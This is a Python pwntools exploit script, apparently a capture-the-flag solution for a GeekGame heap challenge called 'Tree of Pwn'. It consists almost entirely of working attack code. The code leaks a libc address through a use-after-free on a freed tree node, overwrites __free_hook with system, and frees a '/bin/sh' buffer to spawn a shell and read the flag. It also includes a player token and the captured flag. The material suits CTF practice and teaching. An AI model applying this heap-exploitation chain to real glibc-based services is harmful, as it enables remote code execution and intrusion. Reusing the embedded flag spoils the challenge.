from pwn import *

conn = remote('prob14.geekgame.pku.edu.cn', '10014')
# conn = process('./rtree')

print(conn.recvuntil(b'token: '), end = '>\n')
conn.sendline(b'165:MEQCIAO8Cvf2ewr9c8j2xJV-2MKt019qD2WRxsITgGZxEv-aAiApyfqPGe_LnG5HPuSqMFZzFLumbfL6yfGLiFS2WrnJQw==')

# struct node:
# 0      1       2       3       4       5       6      
# int32  char*   int32   node*   node*   node*   node*  
# key    data    size    lson    rson    fatr    next    

# gdb notes: [in breakpoint: glibc_read()]
# r10+0x202e
# root     = +0x00004050
# r10-0x64b
# info()   = +0x000019d7
# r10-0x723
# update() = +0x000018ff

# utils 
def nodbgcreate(key, len, payload):
    conn.recvuntil(b'>>')
    conn.sendline(b'1')
    conn.recvuntil(b'key')
    conn.sendline(f'{key}'.encode('utf-8'))
    conn.recvuntil(b'data')
    conn.sendline(f'{len}'.encode('utf-8'))
    conn.recvuntil(b'data')
    conn.sendline(payload)

def create(key, len, payload):
    print(conn.recvuntil(b'>>'))
    conn.sendline(b'1')
    print(conn.recvuntil(b'key'))
    conn.sendline(f'{key}'.encode('utf-8'))
    print(conn.recvuntil(b'data'))
    conn.sendline(f'{len}'.encode('utf-8'))
    print(conn.recvuntil(b'data'))
    conn.sendline(payload)

def remove(key):
    print(conn.recvuntil(b'>>'))
    conn.sendline(b'3')
    print(conn.recvuntil(b'remove'))
    conn.sendline(f'{key}'.encode('utf-8'))

def debug():
    gdb.attach(proc.pidof(conn)[0])

# Allocate some random things to exhaust the trash bin
# to avoid random errors. 
create(0, 640000, b'root')
for _ in range(16):
    for siz in range(2, 64):
        nodbgcreate(0, siz, b'\x00')

print('done')

create(         -9,         56, b'dummy_block')
create(        -10,         56, b'dummy_block')
remove(        -10)
remove(         -9)
# [-9h D][-9d D]

create(        -11,       4096, b'dummy_block')
create(          1,         56, b'vuln') 
create(          1,       4096, b'vuln_next')

# [-11h][1h][1d][1*h][...]

# debug()

# this remove leaves a backdoor root -> rson 
remove(          1)
remove(        -11)

# [-11h D][1h D][1d D][1*h][...]

# debug()

create(         -4,       56, b'')

# [!] is vulnerable block 
# [-4h][-4d!][1d D][1*h][...]

#print(conn.recvuntil(b'>>'))
#conn.sendline(b'2')
#numb = 0
#print(conn.recvuntil(b'show'))
#conn.sendline(f'{numb}'.encode('utf-8'))

# now we can use node -4 to access the stray node 1
print(conn.recvuntil(b'>>'))
conn.sendline(b'2')
numb = -4
print(conn.recvuntil(b'show'))
conn.sendline(f'{numb}'.encode('utf-8'))
print(conn.recvuntil(b'is: \n'))
resp = conn.recvuntil(b'welcome to the Tree of Pwn', drop=True)

# address of [1d D] above ... + 0x40 ? 
# print('resp =', resp.hex())
# value = resp

# nextPtr          #data            #siz             
# 0a889549f5550000 0000000000000000 3800000000000000 0000000000000000 0000000000000000 a0129149f5550000 a0889549f5550000
val = int.from_bytes(resp, byteorder='little')
# print(val)
addr = 2 ** 64
ptrval = val % addr
target_addr = (ptrval + 0x16 + 0xc0)
updatewrite = val + target_addr * addr - ptrval + 1
hack4 = updatewrite.to_bytes(56, byteorder='little')
# print('requ =', hack4.hex())

# update the header of deleted chunk so that we can access it 
print(conn.recvuntil(b'>>'))
conn.sendline(b'4')
numb = -4
print(conn.recvuntil(b'data'))
conn.sendline(f'{numb}'.encode('utf-8'))
print(conn.recvuntil(b'data'))
conn.sendline(hack4)

# conn.interactive()

# access the data of chunk 1. This leaks libc addr. 
print(conn.recvuntil(b'>>'))
conn.sendline(b'2')
numb = 1
print(conn.recvuntil(b'show'))
conn.sendline(f'{numb}'.encode('utf-8'))
print(conn.recvuntil(b'is: \n'))
resp = conn.recvuntil(b'welcome to the Tree of Pwn', drop=True)

# print('resp =', resp.hex())
libcval = int.from_bytes(resp, byteorder='little')
# print('target =', hex(target_addr))
leak_libc_addr = libcval % addr

# data are from local gdb 
system_delta = 0x19a950
hook_delta   = 0x19cbb8
system_addr  = leak_libc_addr - system_delta
hook_addr    = system_addr + hook_delta

# Then we get the system addr and hook addr from libc code 
print('system =', hex(system_addr))
print('freeh  =', hex(hook_addr))

target_addr = hook_addr
updatewrite = val + target_addr * addr - ptrval + 1
hack4 = updatewrite.to_bytes(56, byteorder='little')
sysctrl = system_addr.to_bytes(8, byteorder='little')

# debug()

# overwrite hook_addr to tree[-4] -> data 
print(conn.recvuntil(b'>>'))
conn.sendline(b'4')
numb = -4
print(conn.recvuntil(b'data'))
conn.sendline(f'{numb}'.encode('utf-8'))
print(conn.recvuntil(b'data'))
conn.sendline(hack4)

# for debug 
# print(conn.recvuntil(b'>>'))
# conn.sendline(b'2')
# numb = -4
# print(conn.recvuntil(b'show'))
# conn.sendline(f'{numb}'.encode('utf-8'))
# print(conn.recvuntil(b'is: \n'))
# dbg = conn.recvuntil(b'welcome to the Tree of Pwn', drop=True)
# print(dbg.hex())

# overwrite __free_hook 
print(conn.recvuntil(b'>>'))
conn.sendline(b'4')
numb = 1
print(conn.recvuntil(b'data'))
conn.sendline(f'{numb}'.encode('utf-8'))
print(conn.recvuntil(b'data'))
conn.sendline(sysctrl)

# debug()

# send a free request 
create(    -114514,       4096, b'/bin/sh')
remove(    -114514)

conn.sendline(b'cat /flag')
# -3
# -114514

# shell reached

# cat /flag
# flag{it5_a_FA113N_leAF_4_U4f_LE4F} 

conn.interactive()

# gdb.attach(proc.pidof(conn)[0])
# debug()
